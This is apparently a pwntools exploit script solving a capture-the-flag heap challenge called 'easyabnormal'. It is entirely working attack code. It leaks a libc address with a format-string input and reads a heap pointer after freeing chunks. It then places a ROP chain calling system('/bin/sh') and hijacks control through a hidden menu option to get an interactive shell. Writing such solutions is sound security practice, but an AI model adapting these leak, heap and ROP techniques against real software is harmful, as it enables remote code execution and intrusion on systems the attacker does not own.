from pwn import *
context(log_level='info',os='linux',arch='amd64')
#p=remote('123.56.52.128','10012')
libc = ELF('/mnt/hgfs/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so')
ld = ELF('/mnt/hgfs/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so')
elf = ELF("./easyabnormal")
p  = process(argv=[ld.path,elf.path],env={"LD_PRELOAD" : libc.path})
def name():
	p.recvuntil("CHOICE :")
	p.sendline('1')

def add(content):
	p.recvuntil("CHOICE :")
	p.sendline('2')
	p.recvuntil("cnt:")
	p.sendline(content)
def free(id):
	p.recvuntil("CHOICE :")
	p.sendline('3')
	p.recvuntil("idx:")
	p.sendline(str(id))
def show():
	p.recvuntil("CHOICE :")
	p.sendline('4')
def backdoor(content):
	p.recvuntil("CHOICE :")
	p.sendline('23333')
	p.recvuntil("INPUT")
	p.send(content)

p.recvuntil(":")
p.send('%11$p')#leak
name()
p.recvuntil('INFO:')
libc_base = int(p.recv(14),16)-240-libc.sym['__libc_start_main']
print(hex(libc_base))

ret = libc_base + 0x937 
pop_rdi= libc_base + 0x21112

system = libc_base + libc.sym['system']
print(hex(system))
str_binsh = libc_base + libc.search('/bin/sh').next()
payload = p64(ret)+p64(pop_rdi)+p64(str_binsh)+p64(system)

add('a')
add('b'*0x18+payload)
free(1)
free(0)
show()
p.recvuntil("1:")
heap_addr = u64(p.recv(6).ljust(8,'\x00'))
print(hex(heap_addr))
print(hex(libc_base))
#gdb.attach(p)
#pause()
backdoor('a'*0x20+p64(heap_addr+0x20))
p.interactive()

